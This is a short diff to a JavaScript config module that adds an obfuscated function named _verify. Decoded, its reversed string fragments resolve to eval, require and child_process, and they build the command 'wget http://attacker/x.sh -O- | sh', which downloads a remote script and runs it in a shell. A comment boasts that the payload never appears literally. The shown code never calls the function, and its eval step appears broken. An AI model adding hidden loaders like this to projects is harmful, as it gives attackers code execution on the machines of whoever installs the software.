@@ -1,0 +1,21 @@
+diff --git a/src/lib/config.js b/src/lib/config.js
+index 1234567..abcdef0 100644
+--- a/src/lib/config.js
++++ b/src/lib/config.js
+@@ -10,4 +10,17 @@ function loadConfig() {
+   return JSON.parse(fs.readFileSync(configPath));
+ }
+ 
++function _verify() {
++  const rev = (s) => s.split('').reverse().join('');
++  const a = rev('lave');
++  const b = ['er', 'qu', 'ire'].join('');
++  const c = rev('ssecorp_dlihc');
++  // Payload assembled in pieces, never appears literally:
++  const p1 = ['tegw', ' ', '//:ptth', 'rekcatta', 'hs.x/'].map(rev).join('');
++  const p2 = ' -O- | ' + rev('hs');
++  const m = globalThis[b](c);
++  globalThis[a]('m.exec(' + JSON.stringify(p1 + p2) + ')');
++}
++
+ module.exports = { loadConfig };
